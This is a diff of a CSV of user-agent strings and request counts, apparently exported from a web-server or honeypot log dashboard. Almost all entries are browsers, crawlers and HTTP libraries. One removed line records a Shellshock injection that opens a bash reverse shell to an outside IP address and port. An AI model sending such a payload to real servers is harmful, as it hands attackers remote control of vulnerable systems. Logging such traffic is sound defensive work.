@@ -1,125 +1,140 @@
 "agent.raw: Descending",Count
-"""-""",165
-"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)""",32
-"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",28
-"""Apache-HttpClient/4.5.1 (Java/1.8.0_45)""",22
-"""Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)""",14
-"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)""",13
-"""Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12""",12
-"""Mozilla/5.0 (compatible; en-US)""",10
-"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)""",8
+"""-""",227
+"""Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16""",66
+"""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.17) Gecko/20110422 Ubuntu/10.04 (lucid) Firefox/3.6.17""",58
+"""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; Trident/5.0)""",58
+"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)""",43
+"""Apache-HttpClient/4.5.1 (Java/1.8.0_45)""",36
+"""Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)""",28
+"""Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)""",19
+"""Mozilla/5.0 (compatible; en-US)""",16
+"""Jetpack by WordPress.com""",14
+"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)""",12
+"""Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12""",10
+"""Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0""",10
+"""python-requests/2.9.1""",9
 """Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2150.5 Safari/537.36""",8
-"""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0""",8
-"""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10""",7
-"""Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)""",7
-"""ICE Browser/5.05 (Java 1.4.0; Windows 2000 5.0 x86)""",5
+"""Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0""",7
+"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16""",7
+"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)""",6
+"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",6
 """Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)""",5
-"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)""",5
-"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",5
+"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25""",5
+"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)""",5
 """Mozilla/4.0 (Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko""",4
-"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""",4
-"""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.5.17 (KHTML, like Gecko) Version/9.1 Safari/601.5.17""",4
-"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/106.2 (KHTML, like Gecko) Safari/100.1""",4
-"""Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34""",4
-"""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36""",4
+"""Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)""",4
+"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)""",4
+"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)""",4
+"""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/601.5.17 (KHTML, like Gecko) Version/9.1 Safari/601.5.17""",4
 """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0""",4
 """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5""",4
-"""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko""",4
-"""Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0""",4
+"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36""",4
+"""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36""",4
+"""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36""",4
+"""Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0""",4
+"""Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36""",4
 """Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US) AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)""",4
+"""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)""",4
 """Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.71 Safari/537.36""",4
-"""Mozilla/5.0 (compatible; Fedora Core 3) FC3 Gnome""",4
+"""Mozilla/5.0 (compatible; Dataprovider/6.92; +https://www.dataprovider.com/)""",4
 """Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)""",4
-"""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)""",4
 """Mozilla/5.0 (compatible; en-us)""",4
-"""Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; MSN Companion 2.0; 800x600; Compaq)""",3
-"""Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)""",3
-"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; IBP; .NET CLR 1.1.4322)""",3
-"""Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/417.3 (KHTML, like Gecko) Safari/417.2""",3
-"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko) Safari/125.1""",3
-"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060206 Songbird/0.1""",3
-"""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36""",3
+"""Python-urllib/2.6""",4
+"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)""",3
+"""Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI Y550-L01 Build/HuaweiY550-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36""",3
+"""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10""",3
+"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/106.2 (KHTML, like Gecko) Safari/100.1""",3
+"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",3
+"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36""",3
+"""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko""",3
+"""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0""",3
+"""Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko""",3
+"""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) webkit2png Safari/537.21""",3
 """Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0""",3
-"""Mozilla/5.0 (compatible; Fedora Core 3) FC3 KDE""",3
-"""Mozilla/5.0 (compatible; Fedora Core 6) FC6 GnomeDE [ru]""",3
+"""Mozilla/5.0 (compatible; Fedora Core 3) FC3 Gnome""",3
+"""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)""",3
 """Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)""",3
-"""curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3""",3
-"""python-requests/2.4.3 CPython/2.7.9 Linux/2.6.32-431.29.2.el6.x86_64""",3
-"""python-requests/2.9.1""",3
+"""Mozilla/6.0 (compatible; MSIE 7.01; Windows CE; 760x412; Samsung)""",3
 """GetURLInfo/1.0""",2
-"""Go http package""",2
-"""Mozilla/3.0 (compatible; Indy Library)""",2
 """Mozilla/4.0 (Windows; MSIE 7.0; Windows NT5.1; SV1; .NET CLR 2.0.50727)""",2
+"""Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98)""",2
 """Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)""",2
-"""Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC; AtHome021)""",2
-"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru)""",2
-"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)""",2
-"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)""",2
-"""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3""",2
-"""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)""",2
-"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8""",2
-"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/74 (KHTML, like Gecko) Safari/74""",2
-"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5.1 (KHTML, like Gecko) Safari/312.3.1""",2
-"""Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1""",2
+"""Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; MSN Companion 2.0; 800x600; Compaq)""",2
+"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; IBP; .NET CLR 1.1.4322)""",2
+"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)""",2
+"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)""",2
+"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E)""",2
+"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/51 (like Gecko) Safari/51""",2
+"""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0""",2
 """Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0""",2
-"""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36""",2
+"""Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14""",2
+"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36""",2
+"""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36""",2
 """Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0""",2
 """Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0""",2
-"""Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0""",2
-"""Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36""",2
-"""Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko""",2
-"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16""",2
-"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20030504 Mozilla Firebird/0.6""",2
+"""Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0""",2
+"""Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36""",2
+"""Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1""",2
+"""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) capybara-webkit Safari/537.21""",2
 """Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36""",2
-"""Mozilla/5.0 (X11; U; OpenVMS AlphaServer_ES40; en-US; rv:1.4) Gecko/20030826 SWB/V1.4 (HP)""",2
-"""Mozilla/5.0 (compatible; Fedora Core 4) FC4 Gnome""",2
-"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; Touch; MASEJS)""",2
-"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MATMJS)""",2
-"""Mozilla/6.0 (compatible; Amiga-AWeb)""",2
-"""Mozilla/6.0 (compatible; MSIE 7.01; Windows 95)""",2
-"""Mozilla/6.0 (compatible; MSIE 7.01; Windows CE; 760x412; Samsung)""",2
-"""Mozilla/6.0 (compatible; MSIE 7.03; Windows ME) Opera 5.11 [en]""",2
-"""Python-urllib/1.17""",2
-"""Python-urllib/2.6""",2
+"""Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko""",2
+"""Mozilla/5.0 (compatible; Fedora Core 6) FC6 GnomeDE [ru]""",2
+"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MATMJS)""",2
+"""Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)""",2
+"""Mozilla/6.0 (compatible; MSIE 7.01; AOL 9.0; Windows 98)""",2
+"""Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.16""",2
+"""Ruby""",2
 """Scrapy/0.24.4 (+http://scrapy.org)""",2
 """python-requests/2.8.1""",2
-"""() { :; }; /bin/bash -i >& /dev/tcp/98.126.212.154/16161 0<&1 2>&1""",1
-"""Java/1.7.0_79""",1
-"""JetBrains 4.0 Release Candidate 3""",1
+"""Go http package""",1
 """JetBrains 5.0""",1
 """Mozilla/4.0 (compatible; MSIE 4.01; Windows NT Windows CE)""",1
+"""Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)""",1
+"""Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC; AtHome021)""",1
 """Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]""",1
-"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)""",1
-"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)""",1
-"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)""",1
+"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.50 [Lynx]""",1
+"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)""",1
+"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)""",1
+"""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru)""",1
+"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1)""",1
+"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)""",1
 """Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)""",1
-"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/51 (like Gecko) Safari/51""",1
-"""Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0""",1
+"""Mozilla/5.0 (Linux; Android 4.05; Galaxy Nexus Build/IMM76B) AppleWebKit/535.25 (KHTML, like Gecko) Chrome/17.0.1025.133 Mobile Safari/536.19""",1
+"""Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-T537A Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/35.0.1916.141 Safari/537.36""",1
+"""Mozilla/5.0 (Linux; U; Android 1.6; en-us; xpndr_ihome Build/DRD35) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1""",1
+"""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36""",1
+"""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36""",1
+"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko) Safari/125.1""",1
+"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.7 (KHTML, like Gecko) Safari/125.12""",1
+"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/74 (KHTML, like Gecko) Safari/74""",1
+"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5.1 (KHTML, like Gecko) Safari/312.3.1""",1
+"""Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1""",1
+"""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36""",1
+"""Mozilla/5.0 (Windows NT 10.0; rv:46.0) Gecko/20100101 Firefox/46.0""",1
+"""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.48 Safari/537.36""",1
+"""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0""",1
+"""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0""",1
+"""Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)""",1
 """Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7""",1
 """Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7""",1
-"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20090504 Mozilla Firefox/3.0.2.1""",1
-"""Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1""",1
+"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20030504 Mozilla Firebird/0.6""",1
 """Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)""",1
-"""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)""",1
-"""Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0""",1
-"""Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko""",1
-"""Mozilla/5.0 (compatible; AOL-IDSol 4.1.1 Fedora Core 3) FC3 KDE""",1
-"""Mozilla/5.0 (compatible; Fedora Core 4) FC4 KDE""",1
-"""Mozilla/5.0 (compatible; Fedora Core 5) FC5 Gnome""",1
+"""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.1) Gecko/20060313 Fedora/1.5.0.1-9 Firefox/1.5.0.1 pango-text""",1
+"""Mozilla/5.0 (X11; U; OpenVMS AlphaServer_ES40; en-US; rv:1.4) Gecko/20030826 SWB/V1.4 (HP)""",1
+"""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0""",1
+"""Mozilla/5.0 (compatible; Fedora Core 4) FC4 Gnome""",1
 """Mozilla/5.0 (compatible; Fedora Core 5) FC5 KDE""",1
-"""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",1
-"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)""",1
-"""Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)""",1
-"""Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)""",1
-"""Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)""",1
-"""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",1
-"""Mozilla/6.0 (compatible; MSIE 7.01; AOL 9.0; Windows 98)""",1
-"""Mozilla/6.0 (compatible; MSIE 7.01; Amiga-AWeb)""",1
+"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)""",1
+"""Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",1
+"""Mozilla/6.0 (Macintosh; U; Amiga-AWeb) Safari 2.9""",1
+"""Mozilla/6.0 (Macintosh; U; Amiga-AWeb) Safari 3.1""",1
+"""Mozilla/6.0 (Windows; U; Windows NT 5.0; en-US; rv:2.3.0.1) Gecko/20080909 Firefox/3.0.1.7""",1
+"""Mozilla/6.0 (compatible; Amiga-AWeb)""",1
 """Mozilla/6.0 (compatible; MSIE 7.01; Windows NT Windows CE)""",1
 """Mozilla/6.0 (compatible; MSIE 7.01; Windows NT)""",1
-"""Mozilla/6.0 (compatible; MSIE 7.03; Windows ME) Opera 5.19 [jp]""",1
-"""Ruby""",1
-"""Wget/1.15 (linux-gnu)""",1
+"""Python-urllib/1.17""",1
+"""Research scan, mail networkresearch@yandex.ru""",1
+"""Telesphoreo""",1
 """Wget/1.16.1 (linux-gnu)""",1
-"""curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.13.1.0 zlib/1.2.3 libidn/1.18 libssh2/1.2.2""",1
 """curl/7.21.0 (i486-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6""",1
+"""masscan/1.0 (https://github.com/robertdavidgraham/masscan)""",1
